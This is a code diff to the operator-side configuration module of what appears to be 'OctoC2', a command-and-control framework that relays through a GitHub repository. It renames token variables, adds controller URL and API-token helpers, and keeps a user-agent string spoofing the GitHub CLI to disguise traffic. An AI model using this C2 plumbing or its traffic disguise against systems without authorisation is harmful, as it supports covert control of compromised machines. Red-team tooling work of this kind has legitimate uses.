@@ -7,9 +7,10 @@
 
 import { Octokit } from "@octokit/rest";
 import { base64ToBytes, bytesToBase64, openSealBox, generateOperatorKeyPair } from "./crypto.ts";
+import { normalizeHttpsControllerUrl } from "./controllerUrl.ts";
 
 export interface OctoctlEnv {
-  token:            string;
+  githubToken:      string;
   owner:            string;
   repo:             string;
   operatorSecretKey: Uint8Array;
@@ -52,14 +53,15 @@ export async function resolvePublicKey(
 }
 
 export async function resolveEnv(): Promise<OctoctlEnv> {
-  const token = process.env["OCTOC2_GITHUB_TOKEN"]?.trim();
+  const githubToken =
+    process.env["OCTOC2_OPERATOR_GITHUB_TOKEN"]?.trim();
   const owner = process.env["OCTOC2_REPO_OWNER"]?.trim();
   const repo  = process.env["OCTOC2_REPO_NAME"]?.trim();
   const secretB64 = process.env["OCTOC2_OPERATOR_SECRET"]?.trim();
   const dataDir   = process.env["OCTOC2_DATA_DIR"]?.trim() ?? "./data";
 
   const missing: string[] = [];
-  if (!token)     missing.push("OCTOC2_GITHUB_TOKEN");
+  if (!githubToken) missing.push("OCTOC2_OPERATOR_GITHUB_TOKEN");
   if (!owner)     missing.push("OCTOC2_REPO_OWNER");
   if (!repo)      missing.push("OCTOC2_REPO_NAME");
   if (!secretB64) missing.push("OCTOC2_OPERATOR_SECRET");
@@ -74,14 +76,14 @@ export async function resolveEnv(): Promise<OctoctlEnv> {
   }
 
   const octokit = new Octokit({
-    auth:    token!,
+    auth:    githubToken!,
     headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
   });
 
   const operatorPublicKey = await resolvePublicKey(octokit, owner!, repo!);
 
   return {
-    token:            token!,
+    githubToken:      githubToken!,
     owner:            owner!,
     repo:             repo!,
     operatorSecretKey,
@@ -89,6 +91,47 @@ export async function resolveEnv(): Promise<OctoctlEnv> {
     octokit,
     dataDir,
   };
+}
+
+export function requireOperatorApiToken(explicit?: string): string {
+  const token =
+    explicit?.trim() ??
+    process.env["OCTOC2_OPERATOR_API_TOKEN"]?.trim();
+  if (!token) {
+    throw new Error(
+      "OCTOC2_OPERATOR_API_TOKEN is required for controller API access",
+    );
+  }
+  return token;
+}
+
+export function requireControllerServerUrl(explicit?: string): string {
+  const raw =
+    explicit?.trim() ??
+    process.env["OCTOC2_SERVER_URL"]?.trim();
+  if (!raw) {
+    throw new Error(
+      "OCTOC2_SERVER_URL is required for controller API access",
+    );
+  }
+
+  return normalizeHttpsControllerUrl(raw, "OCTOC2_SERVER_URL");
+}
+
+export function controllerFetch(
+  input: string | URL | Request,
+  init: RequestInit = {},
+  caFile =
+    process.env["OCTOC2_HTTP_CA_CERT"]?.trim() || undefined,
+): Promise<Response> {
+  return fetch(input, {
+    ...init,
+    ...(caFile && {
+      tls: {
+        ca: Bun.file(caFile),
+      },
+    }),
+  });
 }
 
 // Re-export crypto helpers that commands need
